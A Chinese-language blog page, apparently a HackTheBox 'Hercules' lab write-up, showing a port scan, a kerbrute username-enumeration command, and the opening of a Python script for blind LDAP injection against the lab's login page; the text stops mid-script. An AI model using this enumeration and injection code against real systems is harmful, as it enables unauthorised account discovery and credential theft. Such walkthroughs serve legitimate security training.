@@ -1,0 +1,1541 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB Hercules | Ya1orin
+</title>
+<meta name="description" content="HackTheBox篇Season 9系列之Hercules"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB Hercules | Ya1orin" />
+  <meta
+    property="og:description"
+    content="HackTheBox篇Season 9系列之Hercules"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/htb-hercules/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2025-10-23T15:47:11&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-11T15:14:11&#43;08:00" /><meta property="article:tag" content="WindowsADCSRID CyclingShadow CredentialsADCS-ESC3RBCD on SPN-lessACL abuseLDAP InjectionNTLM Relay" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="HTB Hercules"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">HTB Hercules</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#web渗透">Web渗透</a>
+      <ul>
+        <li><a href="#枚举用户名">枚举用户名</a></li>
+        <li><a href="#ldap注入">LDAP注入</a></li>
+        <li><a href="#任意文件读取cookie伪造越权">任意文件读取+Cookie伪造越权</a></li>
+        <li><a href="#文件上传ntlm反射">文件上传+NTLM反射</a></li>
+      </ul>
+    </li>
+    <li><a href="#域信息收集分析">域信息收集+分析</a></li>
+    <li><a href="#shadow-credentials-攻击">Shadow Credentials 攻击</a></li>
+    <li><a href="#acl滥用">ACL滥用</a></li>
+    <li><a href="#修改auditor密码">修改Auditor密码</a></li>
+    <li><a href="#远程登陆-auditorusertxt">远程登陆 auditor+user.txt</a></li>
+    <li><a href="#机器信息收集">机器信息收集</a></li>
+    <li><a href="#更改fernandor密码">更改fernando.r密码</a></li>
+    <li><a href="#adcs-esc3证书攻击">ADCS ESC3证书攻击</a></li>
+    <li><a href="#rbcd">RBCD</a></li>
+    <li><a href="#远程登陆-ashleyb">远程登陆 ashley.b</a></li>
+    <li><a href="#更改iis_webserver密码">更改IIS_WEBSERVER$密码</a></li>
+    <li><a href="#rbcds4u2self滥用">RBCD+S4U2Self滥用</a></li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-10-23 15:47:11 &#43;0800 CST" itemprop="datePublished"
+      >2025-10-23</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-11</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/hackthebox"
+      data-aos="zoom-in"
+      >HACKTHEBOX</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><blockquote>
+<p>靶机ip：10.10.11.91</p>
+<p>感谢lamber师傅提供的大致解题流程</p>
+<p>传送门：https://lamber-maybe.com/hackthebox/machines/hercules/</p>
+</blockquote>
+<h1 id="知识点">
+<a class="header-anchor" href="#%e7%9f%a5%e8%af%86%e7%82%b9"></a>
+知识点
+</h1><ol>
+<li>kerberos pre_auth</li>
+<li>LDAP注入</li>
+<li>NTLM反射</li>
+<li>Shadow Credentials 攻击</li>
+<li>ACL滥用</li>
+<li>ADCS ESC3</li>
+<li>基于资源的约束性委派</li>
+</ol>
+<h1 id="信息收集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+信息收集
+</h1><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Open 10.10.11.91:53
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:80
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:88
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:135
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:139
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:389
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:443
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:445
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:464
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:593
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:636
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:3268
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:3269
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:5986
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:9389
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:49664
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:49667
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:49674
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:49684
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:56252
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:56272
+</span></span><span class="line"><span class="cl">Open 10.10.11.91:64047
+</span></span></code></pre></div><h1 id="web渗透">
+<a class="header-anchor" href="#web%e6%b8%97%e9%80%8f"></a>
+Web渗透
+</h1><h2 id="枚举用户名">
+<a class="header-anchor" href="#%e6%9e%9a%e4%b8%be%e7%94%a8%e6%88%b7%e5%90%8d"></a>
+枚举用户名
+</h2><p>页面没有任何信息，扫目录只有login，只能先枚举用户名</p>
+<p>先生成字典</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">awk <span class="s1">&#39;/^[[:space:]]*$/ {next} {
+</span></span></span><span class="line"><span class="cl"><span class="s1">    gsub(/^[ \t]+|[ \t]+$/,&#34;&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s1">    for(i=97;i&lt;=122;i++)
+</span></span></span><span class="line"><span class="cl"><span class="s1">        printf &#34;%s.%c\n&#34;, $0, i
+</span></span></span><span class="line"><span class="cl"><span class="s1">}&#39;</span> /usr/share/seclists/Usernames/Names/names.txt <span class="p">|</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>sudo tee /usr/share/seclists/Usernames/Names/names.withletters.txt &gt; /dev/null <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="nb">echo</span> <span class="s2">&#34;Created: /usr/share/seclists/Usernames/Names/names.withletters.txt&#34;</span>
+</span></span></code></pre></div><p>利用<code>kerberos pre_auth</code>进行用户名枚举，<code>fuzz</code>下有哪些域用户</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kerbrute userenum --dc 10.10.11.91 -d hercules.htb <span class="s1">&#39;/usr/share/secLists/Usernames/Names/names.withletters.txt&#39;</span> -t 100 
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20251103104810617-1271838760.png" alt="image-20251103104807089"></p>
+<p>保存用户名到<code>users.txt</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat output.txt <span class="p">|</span> awk -F <span class="s1">&#39; &#39;</span> <span class="s1">&#39;{print $7}&#39;</span> <span class="p">|</span> awk -F <span class="s1">&#39;@&#39;</span> <span class="s1">&#39;{print $1}&#39;</span> &gt; users.txt
+</span></span></code></pre></div><h2 id="ldap注入">
+<a class="header-anchor" href="#ldap%e6%b3%a8%e5%85%a5"></a>
+LDAP注入
+</h2><p><a href="https://brightsec.com/blog/ldap-injection/">https://brightsec.com/blog/ldap-injection/</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Disable SSL warnings</span>
+</span></span><span class="line"><span class="cl"><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Configuration</span>
+</span></span><span class="line"><span class="cl"><span class="n">BASE</span> <span class="o">=</span> <span class="s2">&#34;https://hercules.htb&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LOGIN_PATH</span> <span class="o">=</span> <span class="s2">&#34;/Login&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LOGIN_PAGE</span> <span class="o">=</span> <span class="s2">&#34;/login&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">TARGET_URL</span> <span class="o">=</span> <span class="n">BASE</span> <span class="o">+</span> <span class="n">LOGIN_PATH</span>
+</span></span><span class="line"><span class="cl"><span class="n">VERIFY_TLS</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Success indicator (valid user, wrong password)</span>
+</span></span><span class="line"><span class="cl"><span class="n">SUCCESS_INDICATOR</span> <span class="o">=</span> <span class="s2">&#34;Login attempt failed&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Token regex</span>
+</span></span><span class="line"><span class="cl"><span class="n">TOKEN_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;name=&#34;__RequestVerificationToken&#34;\s+type=&#34;hidden&#34;\s+value=&#34;([^&#34;]+)&#34;&#39;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># All enumerated users (replaced as requested)</span>
+</span></span><span class="line"><span class="cl"><span class="n">KNOWN_USERS</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;adriana.i&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;angelo.o&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ashley.b&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;bob.w&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;camilla.b&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;clarissa.c&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;elijah.m&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;fiona.c&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;harris.d&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;heather.s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;jacob.b&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;jennifer.a&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;jessica.e&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;joel.c&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;johanna.f&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;johnathan.j&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ken.w&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;mark.s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;mikayla.a&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;natalie.a&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;nate.h&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;patrick.s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ramona.l&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ray.n&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;rene.s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;shae.j&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;stephanie.w&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;stephen.m&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tanya.r&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tish.c&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;vincent.g&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;will.s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;zeke.s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;auditor&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_token_and_cookie</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Get fresh CSRF token and cookies&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="n">LOGIN_PAGE</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="n">VERIFY_TLS</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">TOKEN_RE</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">test_ldap_injection</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">description_prefix</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Test if description starts with given prefix using LDAP injection&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Get fresh token</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">get_token_and_cookie</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">token</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Build LDAP injection payload</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">description_prefix</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Escape special characters</span>
+</span></span><span class="line"><span class="cl">        <span class="n">escaped_desc</span> <span class="o">=</span> <span class="n">description_prefix</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;*&#39;</span> <span class="ow">in</span> <span class="n">escaped_desc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">escaped_desc</span> <span class="o">=</span> <span class="n">escaped_desc</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">2a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;(&#39;</span> <span class="ow">in</span> <span class="n">escaped_desc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">escaped_desc</span> <span class="o">=</span> <span class="n">escaped_desc</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">28&#39;</span><span class="p">)</span>
